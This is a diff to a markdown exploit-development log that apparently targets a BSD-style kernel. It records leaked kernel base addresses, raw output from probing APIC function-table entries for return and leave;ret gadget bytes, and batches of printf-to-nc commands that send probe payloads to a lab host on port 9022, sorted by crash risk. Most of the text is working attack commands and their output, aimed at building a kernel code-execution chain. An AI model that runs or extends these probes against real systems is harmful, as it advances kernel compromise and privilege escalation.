@@ -1186,5 +1186,90 @@ printf '\x02\xDD\x00\x00' | nc 192.168.0.88 9022
 ```
 Then send binary.
 
-**Status**: Built (960 bytes, no .bss), awaiting deployment.
+**Status**: Built (960 bytes, no .bss). Deployed and tested.
+
+### v10a fn-2 Probe Results
+
+| Entry | Name | Offset | fn-1 | fn-2 probe | Result |
+|-------|------|--------|------|------------|--------|
+| [2] | xapic_mode | +0x294340 | C3 | sentinel unchanged | **Benign** (48/90/66/CC prefix, NOT C9) |
+| [14] | set_lvt_mode | +0x28E700 | C3 | sentinel unchanged | **Benign** (48/90/66/CC prefix, NOT C9) |
+
+**Raw output (entry [2], fw_ver=0xDD02):**
+```
+kdata_base=0xffffffff96960000, ktext_base=0xffffffff95d60000
+step=0x04 (complete), target_idx=2
+fn=0xffffffff95ff4340, probe_addr=0xffffffff95ff433e
+call_result=0xbad0bad0bad0bad0 (SENTINEL), verdict=2 (ret/benign)
+probe_type=2 (fn-2), end_marker=0xdeadbeefcafe010a
+```
+
+**Raw output (entry [14], fw_ver=0xDD0E):**
+```
+kdata_base=0xffffffff96960000, ktext_base=0xffffffff95d60000
+step=0x04 (complete), target_idx=14
+fn=0xffffffff95fee700, probe_addr=0xffffffff95fee6fe
+call_result=0xbad0bad0bad0bad0 (SENTINEL), verdict=2 (ret/benign)
+probe_type=2 (fn-2), end_marker=0xdeadbeefcafe010a
+```
+
+**Conclusion**: Neither entry [2] nor [14] has leave;ret (C9 C3) at fn-2. Both fn-2 bytes are benign prefixes that fall through to the C3 at fn-1 and return cleanly. Need to scan more entries for fn-1=C3 candidates.
+
+### Next: Systematic fn-1 Scan (0xEE mode)
+
+Only 4 of 28 entries probed for fn-1. 20+ entries remain untested. Use v10a 0xEE mode to find more fn-1=C3 candidates, then probe their fn-2 for C9.
+
+**fn-1 summary so far:**
+```
+[2]  fn-1=C3   [14] fn-1=C3   [19] fn-1=CC   [24] fn-1=PANIC
+```
+
+**Batch 1 — safest entries to probe fn-1:**
+```
+printf '\x03\xEE\x00\x00' | nc 192.168.0.88 9022   # [3]  is_x2apic
+printf '\x05\xEE\x00\x00' | nc 192.168.0.88 9022   # [5]  dump
+printf '\x11\xEE\x00\x00' | nc 192.168.0.88 9022   # [17] lvt_eoi_clear
+printf '\x12\xEE\x00\x00' | nc 192.168.0.88 9022   # [18] set_tpr
+```
+
+**Batch 2 — likely safe:**
+```
+printf '\x00\xEE\x00\x00' | nc 192.168.0.88 9022   # [0]  create
+printf '\x01\xEE\x00\x00' | nc 192.168.0.88 9022   # [1]  init
+printf '\x04\xEE\x00\x00' | nc 192.168.0.88 9022   # [4]  setup
+printf '\x07\xEE\x00\x00' | nc 192.168.0.88 9022   # [7]  set_id
+printf '\x0A\xEE\x00\x00' | nc 192.168.0.88 9022   # [10] ipi_wait
+```
+
+**Batch 3 — moderate risk:**
+```
+printf '\x0B\xEE\x00\x00' | nc 192.168.0.88 9022   # [11] ipi_alloc
+printf '\x0C\xEE\x00\x00' | nc 192.168.0.88 9022   # [12] ipi_free
+printf '\x0D\xEE\x00\x00' | nc 192.168.0.88 9022   # [13] set_lvt_mask
+printf '\x0F\xEE\x00\x00' | nc 192.168.0.88 9022   # [15] set_lvt_polarity
+printf '\x10\xEE\x00\x00' | nc 192.168.0.88 9022   # [16] set_lvt_triggermode
+```
+
+**Batch 4 — remaining:**
+```
+printf '\x14\xEE\x00\x00' | nc 192.168.0.88 9022   # [20] timer_enable_intr
+printf '\x15\xEE\x00\x00' | nc 192.168.0.88 9022   # [21] timer_disable_intr
+printf '\x16\xEE\x00\x00' | nc 192.168.0.88 9022   # [22] timer_set_divisor
+printf '\x19\xEE\x00\x00' | nc 192.168.0.88 9022   # [25] self_ipi
+printf '\x1A\xEE\x00\x00' | nc 192.168.0.88 9022   # [26] unnamed
+printf '\x1B\xEE\x00\x00' | nc 192.168.0.88 9022   # [27] unnamed
+```
+
+Skip [6] disable, [8] ipi_raw, [9] ipi_vectored, [23] timer_initial_count (dangerous side effects).
+
+**Interpretation:**
+- sentinel (0xBAD0BAD0BAD0BAD0) unchanged → **C3** (ret)
+- RAX changed to function return value → **CC** (INT3 → doreti_iret bounce → fn executes)
+- 0xFAFAFAFAFAFAFAFA → **faulted** (#PF caught by pcb_onfault)
+- PANIC (no readback) → **bad byte** (#UD/#GP)
+
+For any new fn-1=C3 entry, immediately probe fn-2 with 0xDD mode:
+```
+printf '\xNN\xDD\x00\x00' | nc 192.168.0.88 9022   # where NN = entry index
+```
 
